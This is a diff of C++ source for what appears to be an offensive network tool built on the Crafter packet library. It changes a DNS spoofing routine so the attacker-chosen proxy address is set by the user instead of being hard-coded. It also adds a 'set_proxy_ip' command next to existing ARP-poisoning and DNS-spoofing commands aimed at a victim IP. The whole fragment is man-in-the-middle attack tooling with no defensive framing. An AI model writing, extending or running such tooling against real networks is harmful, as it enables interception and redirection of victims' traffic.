@@ -645,22 +645,18 @@ void iptables_flush(const string &iface, const string &victim_ip, int dst_port) 
                   " -p udp --sport " + StrPort(dst_port) + " -j DROP").c_str());
 }
 
-void dns_spoof_main(string iface, string dns_ip, string victim_ip) {
+void dns_spoof_main(string iface, string dns_ip, string victim_ip,string proxy) {
     using namespace std;
     using namespace Crafter;
 
     InitCrafter();
 
-    /* Set the interface */
-
     /* Create a structure with information about the attack */
     HostInfo *host_info = new HostInfo;
 
+    spoof_list["proxy"] = proxy;
     /* IP addresses -> This is a data supply by the user */
     short_word dst_port = 53; /* DNS traffic */
-
-    /* List of addresses -> This also is data supplied by the user */
-    spoof_list["proxy"] = "3.3.3.3";
 
     /* Create a HostInfo structure */
     host_info->iface = iface;
@@ -804,12 +800,14 @@ void read_user_input() {
             SET.at(6) = command.erase(0, 15);
         else if (option == "set_dns_ip")
             SET.at(7) = command.erase(0, 11);
+        else if (option == "set_proxy_ip")
+            SET.at(8) = command.erase(0, 13);
         else if (option == "arp_poison")
             arp_main(SET.at(3).c_str(), SET.at(5).c_str(), SET.at(6).c_str());
         else if (option == "show_settings")
             show_settings(SET.at(0), SET.at(2), SET.at(1), SET.at(3));
         else if (option == "dns_sppof")
-            dns_spoof_main(SET.at(3), SET.at(7), SET.at(4));
+            dns_spoof_main(SET.at(3), SET.at(7), SET.at(4),SET.at(8));
         else if (option == "clear")
             cout << "\033[2J\033[1;1H";
         else if (option == "clear_buff")
